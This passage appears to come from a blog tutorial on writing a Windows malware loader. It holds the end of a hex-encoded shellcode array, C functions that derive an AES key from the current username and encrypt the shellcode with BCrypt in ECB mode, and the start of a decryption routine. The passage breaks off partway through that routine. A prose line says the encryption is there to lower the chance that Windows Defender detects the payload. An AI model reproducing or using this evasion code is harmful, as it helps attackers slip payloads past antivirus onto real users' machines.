</span></span><span class=line><span class=cl>    <span class=mh>0xe7</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x2a</span><span class=p>,</span> <span class=mh>0x37</span><span class=p>,</span> <span class=mh>0x49</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x6b</span><span class=p>,</span> <span class=mh>0x0a</span><span class=p>,</span> <span class=mh>0x8a</span><span class=p>,</span> <span class=mh>0x82</span><span class=p>,</span> <span class=mh>0x46</span><span class=p>,</span> <span class=mh>0x0a</span><span class=p>,</span> <span class=mh>0x4a</span><span class=p>,</span> <span class=mh>0x8a</span><span class=p>,</span> <span class=mh>0xa9</span><span class=p>,</span> <span class=mh>0xa6</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>    <span class=mh>0x19</span><span class=p>,</span> <span class=mh>0x0a</span><span class=p>,</span> <span class=mh>0x1a</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0xc0</span><span class=p>,</span> <span class=mh>0x19</span><span class=p>,</span> <span class=mh>0x6b</span><span class=p>,</span> <span class=mh>0xc0</span><span class=p>,</span> <span class=mh>0x09</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x4a</span><span class=p>,</span> <span class=mh>0x9b</span><span class=p>,</span> <span class=mh>0xc0</span><span class=p>,</span> <span class=mh>0xcb</span><span class=p>,</span> <span class=mh>0xc3</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>    <span class=mh>0x4b</span><span class=p>,</span> <span class=mh>0x4b</span><span class=p>,</span> <span class=mh>0x4b</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0xce</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x3f</span><span class=p>,</span> <span class=mh>0x2c</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x4a</span><span class=p>,</span> <span class=mh>0x9b</span><span class=p>,</span> <span class=mh>0x1b</span><span class=p>,</span> <span class=mh>0xc0</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x53</span><span class=p>,</span> <span class=mh>0x0f</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>    <span class=mh>0xc0</span><span class=p>,</span> <span class=mh>0x0b</span><span class=p>,</span> <span class=mh>0x6b</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x4a</span><span class=p>,</span> <span class=mh>0x9b</span><span class=p>,</span> <span class=mh>0xa8</span><span class=p>,</span> <span class=mh>0x1d</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0xb4</span><span class=p>,</span> <span class=mh>0x82</span><span class=p>,</span> <span class=mh>0x0a</span><span class=p>,</span> <span class=mh>0xc0</span><span class=p>,</span> <span class=mh>0x7f</span><span class=p>,</span> <span class=mh>0xc3</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>    <span class=mh>0x4a</span><span class=p>,</span> <span class=mh>0x9d</span><span class=p>,</span> <span class=mh>0x06</span><span class=p>,</span> <span class=mh>0x7a</span><span class=p>,</span> <span class=mh>0x82</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x7a</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0xe7</span><span class=p>,</span> <span class=mh>0x0a</span><span class=p>,</span> <span class=mh>0x8a</span><span class=p>,</span> <span class=mh>0x82</span><span class=p>,</span> <span class=mh>0x46</span><span class=p>,</span> <span class=mh>0x0a</span><span class=p>,</span> <span class=mh>0x4a</span><span class=p>,</span> <span class=mh>0x8a</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>    <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0xab</span><span class=p>,</span> <span class=mh>0x3e</span><span class=p>,</span> <span class=mh>0xba</span><span class=p>,</span> <span class=mh>0x07</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=mh>0x07</span><span class=p>,</span> <span class=mh>0x6f</span><span class=p>,</span> <span class=mh>0x43</span><span class=p>,</span> <span class=mh>0x0e</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x9a</span><span class=p>,</span> <span class=mh>0x3e</span><span class=p>,</span> <span class=mh>0x93</span><span class=p>,</span> <span class=mh>0x13</span><span class=p>,</span> <span class=mh>0x0f</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>    <span class=mh>0xc0</span><span class=p>,</span> <span class=mh>0x0b</span><span class=p>,</span> <span class=mh>0x6f</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x4a</span><span class=p>,</span> <span class=mh>0x9b</span><span class=p>,</span> <span class=mh>0x2d</span><span class=p>,</span> <span class=mh>0x0a</span><span class=p>,</span> <span class=mh>0xc0</span><span class=p>,</span> <span class=mh>0x47</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x0f</span><span class=p>,</span> <span class=mh>0xc0</span><span class=p>,</span> <span class=mh>0x0b</span><span class=p>,</span> <span class=mh>0x57</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>    <span class=mh>0x4a</span><span class=p>,</span> <span class=mh>0x9b</span><span class=p>,</span> <span class=mh>0x0a</span><span class=p>,</span> <span class=mh>0xc0</span><span class=p>,</span> <span class=mh>0x4f</span><span class=p>,</span> <span class=mh>0xc3</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x4a</span><span class=p>,</span> <span class=mh>0x9b</span><span class=p>,</span> <span class=mh>0x0a</span><span class=p>,</span> <span class=mh>0x13</span><span class=p>,</span> <span class=mh>0x0a</span><span class=p>,</span> <span class=mh>0x13</span><span class=p>,</span> <span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>    <span class=mh>0x0a</span><span class=p>,</span> <span class=mh>0x13</span><span class=p>,</span> <span class=mh>0x0a</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>,</span> <span class=mh>0x0a</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0xc8</span><span class=p>,</span> <span class=mh>0xa7</span><span class=p>,</span> <span class=mh>0x6b</span><span class=p>,</span> <span class=mh>0x0a</span><span class=p>,</span> <span class=mh>0x19</span><span class=p>,</span> <span class=mh>0xb4</span><span class=p>,</span> <span class=mh>0xab</span><span class=p>,</span> <span class=mh>0x13</span><span class=p>,</span> <span class=mh>0x0a</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>    <span class=mh>0x12</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0xc0</span><span class=p>,</span> <span class=mh>0x59</span><span class=p>,</span> <span class=mh>0xa2</span><span class=p>,</span> <span class=mh>0x1c</span><span class=p>,</span> <span class=mh>0xb4</span><span class=p>,</span> <span class=mh>0xb4</span><span class=p>,</span> <span class=mh>0xb4</span><span class=p>,</span> <span class=mh>0x16</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0xf1</span><span class=p>,</span> <span class=mh>0x4a</span><span class=p>,</span> <span class=mh>0x4b</span><span class=p>,</span> <span class=mh>0x4b</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>    <span class=mh>0x4b</span><span class=p>,</span> <span class=mh>0x4b</span><span class=p>,</span> <span class=mh>0x4b</span><span class=p>,</span> <span class=mh>0x4b</span><span class=p>,</span> <span class=mh>0x4b</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0xc6</span><span class=p>,</span> <span class=mh>0xc6</span><span class=p>,</span> <span class=mh>0x4a</span><span class=p>,</span> <span class=mh>0x4a</span><span class=p>,</span> <span class=mh>0x4b</span><span class=p>,</span> <span class=mh>0x4b</span><span class=p>,</span> <span class=mh>0x0a</span><span class=p>,</span> <span class=mh>0xf1</span><span class=p>,</span> <span class=mh>0x7a</span><span class=p>,</span> <span class=mh>0xc0</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>    <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0xcc</span><span class=p>,</span> <span class=mh>0xb4</span><span class=p>,</span> <span class=mh>0x9e</span><span class=p>,</span> <span class=mh>0xf0</span><span class=p>,</span> <span class=mh>0xbb</span><span class=p>,</span> <span class=mh>0xfe</span><span class=p>,</span> <span class=mh>0xe9</span><span class=p>,</span> <span class=mh>0x1d</span><span class=p>,</span> <span class=mh>0x0a</span><span class=p>,</span> <span class=mh>0xf1</span><span class=p>,</span> <span class=mh>0xed</span><span class=p>,</span> <span class=mh>0xde</span><span class=p>,</span> <span class=mh>0xf6</span><span class=p>,</span> <span class=mh>0xd6</span><span class=p>,</span> <span class=mh>0xb4</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>    <span class=mh>0x9e</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0xc8</span><span class=p>,</span> <span class=mh>0x8f</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x4d</span><span class=p>,</span> <span class=mh>0x37</span><span class=p>,</span> <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0xcb</span><span class=p>,</span> <span class=mh>0xb0</span><span class=p>,</span> <span class=mh>0xab</span><span class=p>,</span> <span class=mh>0x3e</span><span class=p>,</span> <span class=mh>0x4e</span><span class=p>,</span> <span class=mh>0xf0</span><span class=p>,</span> <span class=mh>0x0c</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>    <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0x39</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x21</span><span class=p>,</span> <span class=mh>0x4b</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>,</span> <span class=mh>0x0a</span><span class=p>,</span> <span class=mh>0xc2</span><span class=p>,</span> <span class=mh>0x91</span><span class=p>,</span> <span class=mh>0xb4</span><span class=p>,</span> <span class=mh>0x9e</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>,</span> <span class=mh>0x2a</span><span class=p>,</span> <span class=mh>0x27</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>    <span class=mh>0x2e</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x2e</span><span class=p>,</span> <span class=mh>0x4b</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>const</span> <span class=n>DWORD</span> <span class=n>shellcodeSize</span> <span class=o>=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>shellcode</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// AES Configuration
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#define AES_KEY_LENGTH 16  </span><span class=c1>// 128-bit AES
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#define AES_BLOCK_SIZE 16
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=c1>// Helper function to generate encryption key from user environment
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>BOOL</span> <span class=nf>GenerateKeyFromEnvironment</span><span class=p>(</span><span class=n>BYTE</span><span class=o>*</span> <span class=n>key</span><span class=p>,</span> <span class=n>DWORD</span> <span class=n>keySize</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>CHAR</span> <span class=n>username</span><span class=p>[</span><span class=n>UNLEN</span> <span class=o>+</span> <span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span> <span class=n>usernameLen</span> <span class=o>=</span> <span class=n>UNLEN</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nf>GetUserNameA</span><span class=p>(</span><span class=n>username</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>usernameLen</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Failed to get username: %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=nf>GetLastError</span><span class=p>());</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>BYTE</span> <span class=n>padding</span> <span class=o>=</span> <span class=mh>0x01</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>DWORD</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>keySize</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>i</span> <span class=o>&lt;</span> <span class=n>usernameLen</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>key</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>BYTE</span><span class=p>)</span><span class=n>username</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>key</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>padding</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>TRUE</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// AES Encryption Function
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>BOOL</span> <span class=nf>AESEncrypt</span><span class=p>(</span><span class=k>const</span> <span class=n>BYTE</span><span class=o>*</span> <span class=n>plaintext</span><span class=p>,</span> <span class=n>DWORD</span> <span class=n>plaintextSize</span><span class=p>,</span> <span class=k>const</span> <span class=n>BYTE</span><span class=o>*</span> <span class=n>key</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>BYTE</span><span class=o>**</span> <span class=n>ciphertext</span><span class=p>,</span> <span class=n>DWORD</span><span class=o>*</span> <span class=n>ciphertextSize</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>BCRYPT_ALG_HANDLE</span> <span class=n>hAlgorithm</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>BCRYPT_KEY_HANDLE</span> <span class=n>hKey</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>NTSTATUS</span> <span class=n>status</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Open AES provider
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>status</span> <span class=o>=</span> <span class=nf>BCryptOpenAlgorithmProvider</span><span class=p>(</span><span class=o>&amp;</span><span class=n>hAlgorithm</span><span class=p>,</span> <span class=n>BCRYPT_AES_ALGORITHM</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nb>NULL</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>status</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;BCryptOpenAlgorithmProvider failed: 0x%x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>status</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Set ECB mode 
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>status</span> <span class=o>=</span> <span class=nf>BCryptSetProperty</span><span class=p>(</span><span class=n>hAlgorithm</span><span class=p>,</span> <span class=n>BCRYPT_CHAINING_MODE</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=n>BYTE</span><span class=o>*</span><span class=p>)</span><span class=n>BCRYPT_CHAIN_MODE_ECB</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=k>sizeof</span><span class=p>(</span><span class=n>BCRYPT_CHAIN_MODE_ECB</span><span class=p>),</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>status</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>BCryptCloseAlgorithmProvider</span><span class=p>(</span><span class=n>hAlgorithm</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;BCryptSetProperty failed: 0x%x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>status</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Create key handle
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>status</span> <span class=o>=</span> <span class=nf>BCryptGenerateSymmetricKey</span><span class=p>(</span><span class=n>hAlgorithm</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>hKey</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=n>BYTE</span><span class=o>*</span><span class=p>)</span><span class=n>key</span><span class=p>,</span> <span class=n>AES_KEY_LENGTH</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>status</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>BCryptCloseAlgorithmProvider</span><span class=p>(</span><span class=n>hAlgorithm</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;BCryptGenerateSymmetricKey failed: 0x%x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>status</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Get output buffer size
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>DWORD</span> <span class=n>cbCiphertext</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>status</span> <span class=o>=</span> <span class=nf>BCryptEncrypt</span><span class=p>(</span><span class=n>hKey</span><span class=p>,</span> <span class=p>(</span><span class=n>BYTE</span><span class=o>*</span><span class=p>)</span><span class=n>plaintext</span><span class=p>,</span> <span class=n>plaintextSize</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nb>NULL</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>cbCiphertext</span><span class=p>,</span> <span class=n>BCRYPT_BLOCK_PADDING</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>status</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>BCryptDestroyKey</span><span class=p>(</span><span class=n>hKey</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>BCryptCloseAlgorithmProvider</span><span class=p>(</span><span class=n>hAlgorithm</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;BCryptEncrypt size check failed: 0x%x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>status</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Allocate ciphertext buffer
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=o>*</span><span class=n>ciphertext</span> <span class=o>=</span> <span class=p>(</span><span class=n>BYTE</span><span class=o>*</span><span class=p>)</span><span class=nf>malloc</span><span class=p>(</span><span class=n>cbCiphertext</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!*</span><span class=n>ciphertext</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>BCryptDestroyKey</span><span class=p>(</span><span class=n>hKey</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>BCryptCloseAlgorithmProvider</span><span class=p>(</span><span class=n>hAlgorithm</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Memory allocation failed</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Perform encryption
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>status</span> <span class=o>=</span> <span class=nf>BCryptEncrypt</span><span class=p>(</span><span class=n>hKey</span><span class=p>,</span> <span class=p>(</span><span class=n>BYTE</span><span class=o>*</span><span class=p>)</span><span class=n>plaintext</span><span class=p>,</span> <span class=n>plaintextSize</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nb>NULL</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=o>*</span><span class=n>ciphertext</span><span class=p>,</span> <span class=n>cbCiphertext</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>ciphertextSize</span><span class=p>,</span> <span class=n>BCRYPT_BLOCK_PADDING</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>status</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=o>*</span><span class=n>ciphertext</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>BCryptDestroyKey</span><span class=p>(</span><span class=n>hKey</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>BCryptCloseAlgorithmProvider</span><span class=p>(</span><span class=n>hAlgorithm</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;BCryptEncrypt failed: 0x%x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>status</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Cleanup
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>BCryptDestroyKey</span><span class=p>(</span><span class=n>hKey</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>BCryptCloseAlgorithmProvider</span><span class=p>(</span><span class=n>hAlgorithm</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>TRUE</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>If all goes well, we succeed in deriving a key and encrypting the shellcode. But we also need an AES decryption routine. The use of AES routines to keep our payload safe further reduces the likelihood of Windows Defender catching us.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=c1>// AES Decryption Function
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>BOOL</span> <span class=nf>AESDecrypt</span><span class=p>(</span><span class=k>const</span> <span class=n>BYTE</span><span class=o>*</span> <span class=n>ciphertext</span><span class=p>,</span> <span class=n>DWORD</span> <span class=n>ciphertextSize</span><span class=p>,</span> <span class=k>const</span> <span class=n>BYTE</span><span class=o>*</span> <span class=n>key</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>BYTE</span><span class=o>**</span> <span class=n>plaintext</span><span class=p>,</span> <span class=n>DWORD</span><span class=o>*</span> <span class=n>plaintextSize</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>BCRYPT_ALG_HANDLE</span> <span class=n>hAlgorithm</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>BCRYPT_KEY_HANDLE</span> <span class=n>hKey</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>NTSTATUS</span> <span class=n>status</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Open AES provider
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>status</span> <span class=o>=</span> <span class=nf>BCryptOpenAlgorithmProvider</span><span class=p>(</span><span class=o>&amp;</span><span class=n>hAlgorithm</span><span class=p>,</span> <span class=n>BCRYPT_AES_ALGORITHM</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nb>NULL</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>status</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;BCryptOpenAlgorithmProvider failed: 0x%x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>status</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Set ECB mode
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>status</span> <span class=o>=</span> <span class=nf>BCryptSetProperty</span><span class=p>(</span><span class=n>hAlgorithm</span><span class=p>,</span> <span class=n>BCRYPT_CHAINING_MODE</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=n>BYTE</span><span class=o>*</span><span class=p>)</span><span class=n>BCRYPT_CHAIN_MODE_ECB</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=k>sizeof</span><span class=p>(</span><span class=n>BCRYPT_CHAIN_MODE_ECB</span><span class=p>),</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>status</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>BCryptCloseAlgorithmProvider</span><span class=p>(</span><span class=n>hAlgorithm</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;BCryptSetProperty failed: 0x%x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>status</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Create key handle
